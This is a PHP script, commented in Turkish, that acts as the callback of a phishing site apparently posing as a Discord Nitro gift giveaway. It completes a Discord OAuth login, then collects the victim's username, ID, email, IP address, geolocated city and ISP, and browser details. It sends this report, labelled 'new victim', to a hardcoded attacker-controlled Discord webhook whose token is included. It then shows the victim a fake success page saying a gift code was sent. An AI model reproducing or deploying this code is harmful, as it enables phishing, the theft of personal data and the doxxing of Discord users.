<?php
// ---- KONFİG BAŞLANGIÇ ----
$client_id = "1518198703305785384";  // SENİN CLIENT ID'N
$client_secret = "1518198703305785384"; // KENDİ CLIENT SECRET'İNİ YAZ
$redirect_uri = "https://nitro-4.onrender.com/discord_callback.php";
$webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";

// Yetki kodu kontrolü
if (!isset($_GET['code'])) {
    die("❌ Yetki kodu alınamadı.");
}
$code = $_GET['code'];

// ---- Access Token Al ----
$token_url = "https://discord.com/api/oauth2/token";
$post_data = [
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $code,
    'redirect_uri' => $redirect_uri
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $token_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code != 200) {
    die("❌ Access token alınamadı. Hata kodu: " . $http_code);
}

$token_data = json_decode($response, true);
if (!isset($token_data['access_token'])) {
    die("❌ Access token alınamadı. Yanıt: " . $response);
}
$access_token = $token_data['access_token'];

// ---- Kullanıcı Bilgilerini Al ----
$user_url = "https://discord.com/api/users/@me";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $user_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Authorization: Bearer " . $access_token
]);
$user_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code != 200) {
    die("❌ Kullanıcı bilgileri alınamadı. Hata kodu: " . $http_code);
}

$user_data = json_decode($user_response, true);
if (!isset($user_data['id'])) {
    die("❌ Kullanıcı bilgileri alınamadı. Yanıt: " . $user_response);
}

// ---- IP ve Konum Bilgilerini Al ----
$ip = $_SERVER['REMOTE_ADDR'];
$konum = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);

// ---- Raporu Hazırla ----
$mesaj = "**🎯 YENİ GİRİŞ YAPAN KURBAN!**\n";
$mesaj .= "─────────────────\n";
$mesaj .= "👤 **Discord Bilgileri:**\n";
$mesaj .= "Kullanıcı: " . ($user_data['username'] ?? 'Bilinmiyor') . "#" . ($user_data['discriminator'] ?? '0000') . "\n";
$mesaj .= "🆔 ID: " . ($user_data['id'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "📧 E-posta: " . ($user_data['email'] ?? 'Gizli') . "\n";
$mesaj .= "✅ Doğrulandı: " . (($user_data['verified'] ?? false) ? 'Evet' : 'Hayır') . "\n";
$mesaj .= "─────────────────\n";
$mesaj .= "🌐 **IP ve Konum:**\n";
$mesaj .= "IP: {$ip}\n";
$mesaj .= "📍 Konum: " . ($konum['country'] ?? 'Bilinmiyor') . " / " . ($konum['city'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "🏢 ISP: " . ($konum['isp'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "─────────────────\n";
$mesaj .= "💻 **Cihaz Bilgisi:**\n";
$mesaj .= "Tarayıcı: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "📅 Zaman: " . date("Y-m-d H:i:s") . "\n";
$mesaj .= "─────────────────";

// ---- Webhook'a Gönder ----
$payload = json_encode(["content" => $mesaj]);
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_exec($ch);
curl_close($ch);

// ---- Kurbana Gösterilecek Sayfa ----
echo "<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <title>Başarılı!</title>
    <style>
        body { background: #0a0a1a; color: #fff; font-family: Arial; text-align: center; padding-top: 150px; }
        .kutu { background: #1a1a3e; padding: 40px; border-radius: 30px; display: inline-block; }
        h1 { color: #00ff88; }
    </style>
</head>
<body>
    <div class='kutu'>
        <h1>✅ Tebrikler!</h1>
        <p>Hediye kodun Discord DM'ne gönderildi.</p>
        <p style='color:#888; font-size:14px;'>Bu sayfa 5 saniye sonra kapanacak.</p>
    </div>
</body>
</html>";
?>
